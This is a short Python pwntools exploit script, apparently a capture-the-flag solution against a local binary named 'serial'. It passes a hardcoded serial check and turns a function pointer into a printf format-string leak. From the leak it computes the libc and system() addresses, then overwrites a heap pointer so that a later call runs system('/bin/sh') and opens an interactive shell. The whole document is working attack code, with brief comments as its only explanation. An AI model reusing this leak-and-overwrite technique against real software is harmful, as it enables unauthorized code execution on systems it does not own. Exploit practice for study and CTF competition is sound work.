from pwn import *

def main():
	#pass serial check
	p = process('./serial')
	p.sendline("615066814080")
	p.recvuntil(">>")
	p.sendline("1")
	p.recvuntil(">>")
	#Change function to printf to make dump a format string vuln
	p.sendline(".%p"*8+"\x90\x07\x40")
	p.recvuntil(">>")
	#printf(*heap)
	p.sendline("3")
	data = p.recvuntil(">>")
	libc_leak = int(data.split(".")[3],16)
	libc_addr = libc_leak-964368
	system_addr = libc_addr+288144
	print "libc:%s"%hex(libc_addr)
	print "system:%s"%hex(system_addr)
	#Remove old data from heap
	p.sendline("2")
	print p.recvuntil(">>")
	p.sendline("2")
	print p.recvuntil(">>")
	#Add new /bin/sh to heap and then call system on next dump
	p.sendline("1")
	print p.recvuntil(">>")
	p.sendline("/bin/sh;"+"D"*16+struct.pack("<Q",system_addr))
	print p.recvuntil(">>")
	#system(*heap)
	p.sendline("3")
	p.interactive()
	pass
main()
